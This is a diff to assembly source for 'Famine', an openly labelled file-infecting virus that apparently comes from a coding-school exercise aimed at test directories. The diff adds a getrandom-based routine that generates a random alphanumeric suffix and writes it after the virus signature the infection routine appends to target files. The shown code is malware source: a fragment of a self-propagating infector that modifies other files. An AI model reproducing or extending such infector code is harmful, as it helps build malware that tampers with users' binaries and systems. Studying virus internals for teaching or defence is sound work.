@@ -336,6 +336,7 @@ v_secondDir:      db "/tmp/test2", 0
 %endif
 v_signature:      db "Famine version 1.0 (c)oded by <ocrossi>-<elaignel>", 0
 v_signature_len:  equ $ - v_signature - 1
+v_random_suffix:  times RANDOM_SUFFIX_LEN db 0  ; Buffer for random suffix
 v_procdir:        db "/proc/", 0
 v_proc_status:    db "/status", 0
 v_proc_test_string: db "Name:	test", 10
@@ -372,6 +373,70 @@ virus_str_len:
     jmp .v_str_len_loop
 .v_str_len_done:
     pop rdi
+    ret
+
+; ============================================
+; virus_generate_random_suffix - Generate random alphanumeric suffix
+; r15 = virus base address (for position-independent access)
+; Generates 8 random alphanumeric characters
+; Stores result in v_random_suffix buffer
+; Uses SYS_GETRANDOM syscall
+; ============================================
+virus_generate_random_suffix:
+    push rbp
+    mov rbp, rsp
+    push rbx
+    push rcx
+    push rdx
+    push rdi
+    push rsi
+
+    ; Get random bytes (position-independent)
+    mov eax, SYS_GETRANDOM
+    lea rdi, [r15 + v_random_suffix - virus_start]
+    mov esi, RANDOM_SUFFIX_LEN
+    xor edx, edx                ; flags = 0 (default)
+    syscall
+
+    ; Convert each byte to alphanumeric character
+    xor rcx, rcx
+.vgrs_convert_loop:
+    cmp rcx, RANDOM_SUFFIX_LEN
+    jge .vgrs_done
+
+    lea rsi, [r15 + v_random_suffix - virus_start]
+    movzx eax, byte [rsi + rcx] ; Get random byte
+    xor rdx, rdx
+    mov ebx, 62                 ; 62 possible chars (0-9, A-Z, a-z)
+    div ebx                     ; rdx = eax % 62
+
+    ; Convert to character: 0-9 (0-9), 10-35 (A-Z), 36-61 (a-z)
+    cmp edx, 10
+    jl .vgrs_digit
+    cmp edx, 36
+    jl .vgrs_upper
+    ; lowercase
+    sub edx, 36
+    add edx, 'a'
+    jmp .vgrs_store
+.vgrs_upper:
+    sub edx, 10
+    add edx, 'A'
+    jmp .vgrs_store
+.vgrs_digit:
+    add edx, '0'
+.vgrs_store:
+    mov byte [rsi + rcx], dl
+    inc rcx
+    jmp .vgrs_convert_loop
+
+.vgrs_done:
+    pop rsi
+    pop rdi
+    pop rdx
+    pop rcx
+    pop rbx
+    pop rbp
     ret
 
 ; ============================================
@@ -1052,6 +1117,9 @@ virus_infect_elf:
     jmp .vi_non_elf_sig_loop
 
 .vi_non_elf_append:
+    ; Generate random suffix before appending
+    call virus_generate_random_suffix
+
     ; Append the signature to the file
     ; Seek to end of file
     mov eax, SYS_LSEEK
@@ -1065,6 +1133,13 @@ virus_infect_elf:
     mov edi, r13d
     lea rsi, [r15 + v_signature - virus_start]
     mov edx, v_signature_len
+    syscall
+    
+    ; Write the random suffix
+    mov eax, SYS_WRITE
+    mov edi, r13d
+    lea rsi, [r15 + v_random_suffix - virus_start]
+    mov edx, RANDOM_SUFFIX_LEN
     syscall
     
     ; Close file and done
